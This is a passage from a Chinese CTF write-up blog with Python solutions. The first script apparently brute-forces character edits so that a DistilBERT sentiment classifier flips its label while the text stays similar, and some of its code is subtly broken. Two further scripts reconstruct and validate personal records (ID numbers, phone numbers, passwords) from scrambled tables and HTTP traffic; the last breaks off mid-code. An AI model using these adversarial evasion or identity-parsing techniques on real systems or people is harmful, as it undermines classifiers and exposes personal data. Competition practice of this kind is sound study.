class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations, product<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> DistilBertTokenizer, DistilBertForSequenceClassification<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_similarity</span>(<span class="hljs-params">original, modified, model, tokenizer</span>):<br>    <span class="hljs-comment"># 确保模型处于评估模式</span><br>    model.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-comment"># 对原始文本和修改后的文本进行编码</span><br>    original_encoding = tokenizer(original, return_tensors=<span class="hljs-string">&#x27;pt&#x27;</span>, padding=<span class="hljs-literal">True</span>, truncation=<span class="hljs-literal">True</span>, max_length=<span class="hljs-number">512</span>)<br>    modified_encoding = tokenizer(modified, return_tensors=<span class="hljs-string">&#x27;pt&#x27;</span>, padding=<span class="hljs-literal">True</span>, truncation=<span class="hljs-literal">True</span>, max_length=<span class="hljs-number">512</span>)<br><br>    <span class="hljs-comment"># 将输入数据移动到 GPU</span><br>    original_encoding = &#123;key: value.to(model.device) <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> original_encoding.items()&#125;<br>    modified_encoding = &#123;key: value.to(model.device) <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> modified_encoding.items()&#125;<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-comment"># 获取原始文本的输出，确保返回 hidden_states</span><br>        original_outputs = model(**original_encoding, output_hidden_states=<span class="hljs-literal">True</span>)<br>        original_hidden_state = original_outputs.hidden_states[-<span class="hljs-number">1</span>].mean(dim=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 取最后一层的均值</span><br><br>        <span class="hljs-comment"># 获取修改后文本的输出，确保返回 hidden_states</span><br>        modified_outputs = model(**modified_encoding, output_hidden_states=<span class="hljs-literal">True</span>)<br>        modified_hidden_state = modified_outputs.hidden_states[-<span class="hljs-number">1</span>].mean(dim=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 取最后一层的均值</span><br><br>    <span class="hljs-comment"># 计算余弦相似度</span><br>    similarity = torch.cosine_similarity(original_hidden_state, modified_hidden_state)<br><br>    <span class="hljs-keyword">return</span> similarity.item()  <span class="hljs-comment"># 转换为标量</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">classify_text</span>(<span class="hljs-params">text, model, tokenizer</span>):<br>    <span class="hljs-comment"># 将模型设置为评估模式</span><br>    model.<span class="hljs-built_in">eval</span>()<br><br>    <span class="hljs-comment"># 对输入文本进行编码</span><br>    encoding = tokenizer(text, return_tensors=<span class="hljs-string">&#x27;pt&#x27;</span>, padding=<span class="hljs-literal">True</span>, truncation=<span class="hljs-literal">True</span>, max_length=<span class="hljs-number">512</span>)<br><br>    <span class="hljs-comment"># 将编码移动到 GPU（如果可用）</span><br>    encoding = &#123;key: value.to(model.device) <span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> encoding.items()&#125;<br><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-comment"># 获取模型的输出，确保返回 hidden_states</span><br>        outputs = model(**encoding, output_hidden_states=<span class="hljs-literal">True</span>)<br>        logits = outputs.logits  <span class="hljs-comment"># 获取 logits</span><br><br>    <span class="hljs-comment"># 计算预测的类别</span><br>    predicted_class = torch.argmax(logits, dim=<span class="hljs-number">1</span>).item()<br><br>    <span class="hljs-keyword">return</span> predicted_class<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_char_at_position</span>(<span class="hljs-params">text, i, rotate_count=<span class="hljs-number">1</span></span>):<br>    <span class="hljs-comment"># 确保位置有效</span><br>    <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> i &gt;= <span class="hljs-built_in">len</span>(text):<br>        <span class="hljs-keyword">return</span> text  <span class="hljs-comment"># 如果位置无效，直接返回原字符串</span><br><br>    <span class="hljs-comment"># 将字符串转换为列表</span><br>    temp_str = <span class="hljs-built_in">list</span>(text)<br>    <span class="hljs-comment"># 根据新的规则替换字符</span><br>    temp_str[i] = rotate_char(temp_str[i], rotate_count)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(temp_str)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotate_char</span>(<span class="hljs-params">c, rotate_count</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rotate_count):<br>        <span class="hljs-keyword">if</span> c == <span class="hljs-string">&#x27;z&#x27;</span>:<br>            c = <span class="hljs-string">&#x27;A&#x27;</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            c = <span class="hljs-string">&#x27;1&#x27;</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;9&#x27;</span>:<br>            c = <span class="hljs-string">&#x27;-&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            c = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(c) + <span class="hljs-number">1</span>)  <span class="hljs-comment"># 获取下一个字符</span><br>    <span class="hljs-keyword">return</span> c<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_combinations</span>(<span class="hljs-params">s, positions, num_chars</span>):<br>    <span class="hljs-comment"># 确保位置有效</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(pos &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> pos &gt;= <span class="hljs-built_in">len</span>(s) <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> positions):<br>        <span class="hljs-keyword">return</span> s  <span class="hljs-comment"># 如果有无效位置，直接返回原字符串</span><br><br>    <span class="hljs-comment"># 生成字符集</span><br>    char_set = [<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>) + <span class="hljs-number">1</span>)] + \<br>               [<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>), <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>) + <span class="hljs-number">1</span>)]<br><br>    <span class="hljs-comment"># 生成所有可能的字符组合</span><br>    <span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> product(char_set, repeat=num_chars):<br>        <span class="hljs-comment"># 将字符组合转换为列表</span><br>        temp_str = <span class="hljs-built_in">list</span>(s)<br>        <br>        <span class="hljs-comment"># 替换指定位置的字符</span><br>        <span class="hljs-keyword">for</span> idx, pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(positions):<br>            <span class="hljs-keyword">if</span> idx &lt; <span class="hljs-built_in">len</span>(combo):  <span class="hljs-comment"># 确保组合的长度不超出位置数组</span><br>                temp_str[pos] = combo[idx]<br><br>        <span class="hljs-comment"># 输出每种组合的结果</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&#x27;&#x27;</span>.join(temp_str))<br><br><br><span class="hljs-comment"># 定义模型和分词器的路径</span><br>model_path = <span class="hljs-string">&quot;Sentiment_classification_model&quot;</span><br><br><span class="hljs-comment"># 加载分词器</span><br>tokenizer = DistilBertTokenizer.from_pretrained(model_path)<br><br><span class="hljs-comment"># 加载模型并移动到 GPU（如果可用）</span><br>device = torch.device(<span class="hljs-string">&#x27;cuda&#x27;</span> <span class="hljs-keyword">if</span> torch.cuda.is_available() <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;cpu&#x27;</span>)<br>model = DistilBertForSequenceClassification.from_pretrained(model_path).to(device)  <span class="hljs-comment"># 使用 ForSequenceClassification</span><br><br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-comment"># 读取数据</span><br>data = pd.read_csv(<span class="hljs-string">&#x27;original_text.csv&#x27;</span>)<br>attack = pd.read_csv(<span class="hljs-string">&#x27;attack.csv&#x27;</span>)<br>success = <span class="hljs-number">0</span><br>succeededRows = []<br><br><br><span class="hljs-keyword">for</span> index, row <span class="hljs-keyword">in</span> data.iterrows():<br>    attackRow = attack.iloc[index]<br>    <span class="hljs-built_in">id</span> = <span class="hljs-built_in">str</span>(row[<span class="hljs-string">&#x27;id&#x27;</span>])<br>    <br>    text = row[<span class="hljs-string">&#x27;text&#x27;</span>]<br>    label = row[<span class="hljs-string">&#x27;original_label&#x27;</span>]<br><br>    attackText = attackRow[<span class="hljs-string">&#x27;text&#x27;</span>]<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">300</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    curPos = i<br>    <span class="hljs-comment"># 遍历数据</span><br>    <span class="hljs-keyword">for</span> index, row <span class="hljs-keyword">in</span> data.iterrows():<br>        <span class="hljs-keyword">if</span> index <span class="hljs-keyword">in</span> succeededRows:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-comment"># get attack text</span><br>        attackRow = attack.iloc[index]<br>        <span class="hljs-comment"># 获取原始文本和修改后的文本</span><br>        <span class="hljs-built_in">id</span> = row[<span class="hljs-string">&#x27;id&#x27;</span>]<br>        text = row[<span class="hljs-string">&#x27;text&#x27;</span>]<br>        label = row[<span class="hljs-string">&#x27;original_label&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text) &lt; curPos:<br>            <span class="hljs-keyword">continue</span><br>        attackText = text<br>        <span class="hljs-comment"># check attack id start with &#x27;*&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(attackRow[<span class="hljs-string">&#x27;id&#x27;</span>])[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;*&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br><br>        <br>        <span class="hljs-comment"># 计算相似度</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span>:<br><br>            <span class="hljs-comment"># remove the character at position i</span><br>            tmpAtt = attackText[:curPos] + attackText[curPos + <span class="hljs-number">1</span>:]<br>            similarity = verify_similarity(text, attackText, model, tokenizer)<br>            <span class="hljs-keyword">if</span> similarity &gt; <span class="hljs-number">0.75</span>:<br>                new_label = classify_text(attackText, model, tokenizer)<br>                <span class="hljs-keyword">if</span> label != new_label:<br>                    <span class="hljs-comment"># print(f&quot;[+] S: &#123;similarity&#125; OC:&#123;label&#125; C: &#123;new_label&#125; ID: &#123;id&#125; edited: &#123;attackText&#125;&quot;)</span><br>                    success += <span class="hljs-number">1</span><br>                    succeededRows.append(index)<br>                    <span class="hljs-keyword">continue</span><br>                    <br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">63</span>):<br>                attackText = attackText[:curPos] + <span class="hljs-string">&#x27;A&#x27;</span> + attackText[curPos + <span class="hljs-number">1</span>:]<br>                attackText = generate_combinations(attackText, [curPos], <span class="hljs-number">1</span>)<br>                attackText = rotate_char_at_position(attackText, curPos, i)<br>                similarity = verify_similarity(text, attackText, model, tokenizer)<br>                <span class="hljs-keyword">if</span> similarity &lt; <span class="hljs-number">0.75</span>:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-comment">#print(f&quot;[?] S: &#123;similarity&#125; OC:&#123;label&#125; C: &#123;new_label&#125; ID: &#123;id&#125; edited: &#123;attackText&#125;&quot;)</span><br>                <span class="hljs-comment"># 获取预测的类别</span><br>                new_label = classify_text(attackText, model, tokenizer)<br>                <span class="hljs-comment"># 打印相似度</span><br><br>                <span class="hljs-keyword">if</span> label != new_label <span class="hljs-keyword">and</span> similarity &gt; <span class="hljs-number">0.75</span>:<br>                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] S: <span class="hljs-subst">&#123;similarity&#125;</span> OC:<span class="hljs-subst">&#123;label&#125;</span> C: <span class="hljs-subst">&#123;new_label&#125;</span> ID: <span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span> edited: <span class="hljs-subst">&#123;attackText&#125;</span>&quot;</span>)<br>                        <span class="hljs-comment"># 修改 attack.csv</span><br>                        attack.at[index, <span class="hljs-string">&#x27;text&#x27;</span>] = attackText<br>                        <span class="hljs-comment"># 对 id 前缀 *</span><br>                        attack.at[index, <span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-string">&#x27;*&#x27;</span> + <span class="hljs-built_in">str</span>(attackRow[<span class="hljs-string">&#x27;id&#x27;</span>])<br>                        <span class="hljs-comment"># 保存修改后的数据</span><br>                        attack.to_csv(<span class="hljs-string">&#x27;attack.csv&#x27;</span>, index=<span class="hljs-literal">False</span>)<br>                        success += <span class="hljs-number">1</span><br>                        succeededRows.append(index)<br>                        <span class="hljs-keyword">break</span><br>        <br>    <span class="hljs-built_in">print</span>(success)<br>        <span class="hljs-comment">#print(f&quot;S: &#123;similarity&#125; OC:&#123;label&#125; C: &#123;new_label&#125;&quot;)</span><br><br></code></pre></td></tr></table></figure><p>直接逐位爆破， 然后判断， 一位不行两位， 能够爆破出来正确的</p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="data-analy1"><a href="#data-analy1" class="headerlink" title="data-analy1"></a>data-analy1</h3><p>就是一个简单的还原EXCEL表</p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> csv<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">juage</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):<br>    result_List=[<span class="hljs-number">0</span>]*<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>:<br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">0x4e00</span> &lt;= <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) &lt;= <span class="hljs-number">0x9fff</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">30007</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">22899</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">22899</span>):<br>            result_List[<span class="hljs-number">3</span>]=i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)&lt;=<span class="hljs-number">5</span>:<br>            <span class="hljs-keyword">try</span>:<br>                result_List[<span class="hljs-number">0</span>]=<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i))<br>            <span class="hljs-keyword">except</span> ValueError:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) == <span class="hljs-number">30007</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) == <span class="hljs-number">22899</span>:<br>                    result_List[<span class="hljs-number">4</span>]=i<br>                <span class="hljs-keyword">else</span>:<br>                    result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">32</span>:<br>            result_List[<span class="hljs-number">2</span>]=i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">try</span>:<br>                result_List[<span class="hljs-number">5</span>] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i))<br>            <span class="hljs-keyword">except</span> ValueError:<br>                result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">18</span>:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>                result_List[<span class="hljs-number">6</span>] = i<br>            <span class="hljs-keyword">except</span> ValueError:<br>                result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(i)==<span class="hljs-number">11</span>:<br>            <span class="hljs-keyword">try</span>:<br>                result_List[<span class="hljs-number">7</span>] = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(i))<br>            <span class="hljs-keyword">except</span> ValueError:<br>                result_List[<span class="hljs-number">1</span>] = i<br>        <span class="hljs-keyword">elif</span> (<span class="hljs-number">0x4e00</span> &lt;= <span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) &lt;= <span class="hljs-number">0x9fff</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">30007</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">30008</span>) <span class="hljs-keyword">and</span> (<span class="hljs-built_in">ord</span>(i[<span class="hljs-number">0</span>]) != <span class="hljs-number">22899</span>):<br>            result_List[<span class="hljs-number">3</span>]=i<br>        <span class="hljs-keyword">else</span>:<br>            result_List[<span class="hljs-number">1</span>]=i<br>    <span class="hljs-keyword">return</span> result_List<br><br>result=[]<br><span class="hljs-comment"># 打开文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;person_data.csv&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> csvfile:<br>    <span class="hljs-comment"># 创建csv.reader对象</span><br>    reader = csv.reader(csvfile)<br><br>    <span class="hljs-comment"># 跳过第一行</span><br>    <span class="hljs-built_in">next</span>(reader)<br>    <span class="hljs-comment"># 逐行读取剩余的数据</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> reader:<br>        <span class="hljs-comment"># 处理每一行数据</span><br>        row=juage(row)<br>        result.append(row)<br>        <span class="hljs-built_in">print</span>(row)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result.csv&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>, newline=<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-comment"># 2. 基于文件对象构建 csv写入对象</span><br>    csv_writer = csv.writer(f)<br>    <span class="hljs-comment"># 3. 构建列表头</span><br>    name=[<span class="hljs-string">&#x27;编号&#x27;</span>,<span class="hljs-string">&#x27;用户名&#x27;</span>,<span class="hljs-string">&#x27;密码&#x27;</span>,<span class="hljs-string">&#x27;姓名&#x27;</span>,<span class="hljs-string">&#x27;性别&#x27;</span>,<span class="hljs-string">&#x27;出生日期&#x27;</span>,<span class="hljs-string">&#x27;身份证号&#x27;</span>,<span class="hljs-string">&#x27;手机号码&#x27;</span>]<br>    csv_writer.writerow(name)<br>    <span class="hljs-comment"># 4. 写入csv文件内容</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:<br>        csv_writer.writerow(i)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;写入数据成功&quot;</span>)<br>    <span class="hljs-comment"># 5. 关闭文件</span><br>    f.close()<br></code></pre></td></tr></table></figure><h3 id="data-analy2"><a href="#data-analy2" class="headerlink" title="data-analy2"></a>data-analy2</h3><p>使用tshark将http流量导出</p><p><img src="https://s2.loli.net/2024/08/27/CwYbMiakfTmhRXA.png" alt="8e0155609279c06818ca3b6b0ac52ce7"></p><p>EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> csv<br><br><br><span class="hljs-comment"># Define datasets at the start</span><br>wgt = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>chk = <span class="hljs-string">&#x27;10X98765432&#x27;</span><br>prf = &#123;<span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, <span class="hljs-number">772</span>,<br>       <span class="hljs-number">778</span>, <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>, <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>,<br>       <span class="hljs-number">756</span>, <span class="hljs-number">766</span>, <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>, <span class="hljs-number">777</span>,<br>       <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>, <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_data</span>(<span class="hljs-params">r</span>):<br>    <span class="hljs-keyword">return</span> (is_usr(r[<span class="hljs-number">0</span>]) <span class="hljs-keyword">and</span> is_nm(r[<span class="hljs-number">1</span>]) <span class="hljs-keyword">and</span> is_sex(r[<span class="hljs-number">2</span>], r[<span class="hljs-number">4</span>]) <span class="hljs-keyword">and</span> <br>            is_brth(r[<span class="hljs-number">3</span>], r[<span class="hljs-number">4</span>]) <span class="hljs-keyword">and</span> is_id(r[<span class="hljs-number">4</span>]) <span class="hljs-keyword">and</span> is_phn(r[<span class="hljs-number">5</span>]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_line</span>(<span class="hljs-params">line</span>):<br>    line = <span class="hljs-built_in">bytes</span>.fromhex(line.strip()).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    sd = re.split(<span class="hljs-string">r&#x27;(?&lt;!\\)&quot;&#x27;</span>, line)<br>    <span class="hljs-keyword">return</span> [sd[<span class="hljs-number">3</span>], sd[<span class="hljs-number">7</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>), <br>            sd[<span class="hljs-number">11</span>].encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode_escape&#x27;</span>), sd[<span class="hljs-number">15</span>], sd[<span class="hljs-number">19</span>], sd[<span class="hljs-number">23</span>]]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_usr</span>(<span class="hljs-params">usr</span>):<br>    <span class="hljs-keyword">return</span> usr.isalnum()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_nm</span>(<span class="hljs-params">nm</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">all</span>(<span class="hljs-string">&#x27;\u4e00&#x27;</span> &lt;= ch &lt;= <span class="hljs-string">&#x27;\u9fff&#x27;</span> <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> nm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_sex</span>(<span class="hljs-params">sx, idc</span>):<br>    <span class="hljs-keyword">return</span> (sx == <span class="hljs-string">&quot;男&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(idc[<span class="hljs-number">16</span>]) % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) <span class="hljs-keyword">or</span> (sx == <span class="hljs-string">&quot;女&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(idc[<span class="hljs-number">16</span>]) % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_brth</span>(<span class="hljs-params">brth, idc</span>):<br>    <span class="hljs-keyword">return</span> brth == idc[<span class="hljs-number">6</span>:<span class="hljs-number">14</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_id</span>(<span class="hljs-params">idc</span>):<br>    chk_sum = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">int</span>(d) * w <span class="hljs-keyword">for</span> d, w <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(idc[:<span class="hljs-number">17</span>], wgt))<br>    <span class="hljs-keyword">return</span> chk[chk_sum % <span class="hljs-number">11</span>] == idc[<span 